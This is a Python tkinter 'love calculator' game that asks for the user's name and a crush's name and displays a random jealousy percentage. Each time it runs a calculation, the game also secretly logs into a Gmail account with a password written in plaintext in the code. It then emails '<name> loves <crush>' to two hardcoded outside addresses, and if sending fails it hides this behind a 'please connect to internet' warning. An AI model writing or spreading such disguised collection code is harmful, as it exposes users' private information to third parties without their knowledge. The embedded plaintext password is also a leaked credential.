from tkinter import *
from tkinter import messagebox
from random import randint
from smtplib import SMTP
def check(s1,s2):
    fp=open("samplefile.txt","a+")
    fp.seek(0,0)
    for i in fp:
        if(s1+s2) in i:
            e=i.index((s1+s2)[-1])
            return i[e+1:e+3]
        elif(s2+s1) in i:
            e=i.index((s2+s1)[-1])
            return i[e+1:e+3]
    else:
        s=str(flames(s1,s2))
        fp.write(s1+s2+s+"\n")
    fp.close()
    return s
def sendit(message):
    s=SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("roja.senthil06@gmail.com", "ROJAsenthil@123")
    s.sendmail("roja.senthil06@gmail.com", ["vivekkancharla31416@gmail.com",'harsha8474@gmail.com'], message)
    s.quit()
w=Tk()
w.title("CALCULATE YOUR LOVE")
w.geometry("700x500")
w.configure(bg='pink')
f="calibre 10 bold"
def flames(s1,s2):
    p=len(s1)+len(s2)
    l=[55,95,80,99,20,85]
    for i in range(len(s1)):
        c=s1[i]
        if(c in s2):
            s1=s1.replace(c,'*',1)
            s2=s2.replace(c,'*',1)
            p-=2
    while(len(l)!=1):
        k=(p-1)%(len(l))
        l=l[k+1:]+l[:k]
    return randint(l[0]-10,l[0])
def cal():
    s1=yna.get()
    s2=cna.get()
    if(s1=='' or s2==''):
        messagebox.showerror("Error",'name cannot be empty')
    else:
        try:
            l=Label(w,text="You feel "+check(s1.replace(' ','').lower(),s2.replace(' ','').lower())+"% jealous of other people in "+s2+"'s life",height=2,width=40,font="calibre 12 bold italic",fg='indigo',bg='pink')
            l.place(relx=0.5,rely=0.8,anchor=CENTER)
            sendit(s1+" loves "+s2)
        except:
            messagebox.showinfo("warning","please connect to internet")
sb=Button(w,text="SUBMIT",command=cal,bg='coral')
yna=Entry(w,bg='light green')
cna=Entry(w,bg='light green')
yn=Label(w,text="YOUR NAME   :",height=1,width=11,font=f,bg='pink')
cn=Label(w,text="CRUSH NAME :",height=1,width=11,font=f,bg='pink')
yn.place(relx=0.4,rely=0.3,anchor=CENTER)
cn.place(relx=0.4,rely=0.5,anchor=CENTER)
yna.place(relx=0.6,rely=0.3,height=20,width=150,anchor=CENTER)
cna.place(relx=0.6,rely=0.5,height=20,width=150,anchor=CENTER)
sb.place(relx=0.5,rely=0.6,anchor=CENTER)
w.mainloop()
